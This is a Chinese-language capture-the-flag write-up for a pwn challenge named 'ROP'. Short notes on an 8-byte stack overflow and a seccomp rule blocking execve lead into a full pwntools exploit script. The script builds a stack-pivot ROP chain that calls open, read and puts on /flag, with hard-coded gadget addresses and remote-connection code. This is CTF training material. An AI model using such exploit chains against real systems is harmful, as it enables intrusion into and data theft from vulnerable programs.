## ROP

- 栈溢出8字节，需要栈迁移

- 用`seccomp`关闭了`SYSCALL execve` 

  ```c
    v0 = seccomp_init(0x7FFF0000LL);
    seccomp_rule_add(v0, 0LL, 0x3BLL, 0LL);
    seccomp_load(v0);
  ```

- 不能用`system('/bin/sh')`，于是用`open+read+puts`打开`/flag`文件并打印

  - `open('/flag',0,0x100)`
  - `read(4,bss_base,0x100)`
  - `puts(bss_base)`

- poc

  ```python
  #!/usr/bin/python
  #coding=utf-8
  #__author__:TaQini
  
  from pwn import *
  
  local_file  = './ROP'
  local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
  remote_libc = local_libc # '../libc.so.6'
  
  is_local = False
  is_remote = False
  
  if len(sys.argv) == 1:
      is_local = True
      p = process(local_file)
      libc = ELF(local_libc)
  elif len(sys.argv) > 1:
      is_remote = True
      if len(sys.argv) == 3:
          host = sys.argv[1]
          port = sys.argv[2]
      else:
          host, port = sys.argv[1].split(':')
      p = remote(host, port)
      libc = ELF(remote_libc)
  
  elf = ELF(local_file)
  
  context.log_level = 'debug'
  context.arch = elf.arch
  
  se      = lambda data               :p.send(data) 
  sa      = lambda delim,data         :p.sendafter(delim, data)
  sl      = lambda data               :p.sendline(data)
  sla     = lambda delim,data         :p.sendlineafter(delim, data)
  sea     = lambda delim,data         :p.sendafter(delim, data)
  rc      = lambda numb=4096          :p.recv(numb)
  ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
  uu32    = lambda data               :u32(data.ljust(4, '\0'))
  uu64    = lambda data               :u64(data.ljust(8, '\0'))
  info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))
  
  def debug(cmd=''):
      if is_local: gdb.attach(p,cmd)
  
  # info
  # gadget
  prdi = 0x0000000000400a43 # pop rdi ; ret
  leave = 0x000000000040090d # leave ; ret
  m3c = 0x00400a20
  p6r = 0x00400a3a
  prsi = 0x0000000000400a41 # pop rsi ; pop r15 ; ret
  prbp = 0x0000000000400830 # pop rbp ; ret
  
  # elf, libc
  buf = 0x6010a0
  open_func = 0x400985
  read_plt = elf.symbols['read']
  main = elf.symbols['main']
  open_plt = elf.symbols['open']
  puts_plt = elf.symbols['puts']
  bss_base = elf.bss() + 0x200
  
  # rop1
  offset = 80
  payload = '\0'*offset
  payload += p64(buf)
  payload += p64(leave)
  
  # open('/flag',0,0x100)
  stack = p64(p6r) + p64(0) + p64(1) + p64(buf+0x8*9) + p64(0x100) + p64(0) + p64(buf+0x8*18) + p64(m3c) + p64(open_plt)
  # read(4,bss_base,0x100)
  stack += p64(0) + p64(1) + p64(buf+0x8*17) + p64(0x100) + p64(bss_base) + p64(0x4) + p64(m3c) + p64(read_plt)
  # padding
  stack += '/flag\0\0\0'
  stack += p64(0xdeadbeef)*5
  # pust(bss_base)
  stack += p64(prdi) + p64(bss_base) + p64(puts_plt) + p64(0xdeadbeef) 
  
  ru('think so?')
  sl('TaQini!!'+stack)
  rc()
  # debug()
  sl(payload)
  # sleep(3)
  sl('TaQini is here~~~')
  
  p.interactive()
  ```

  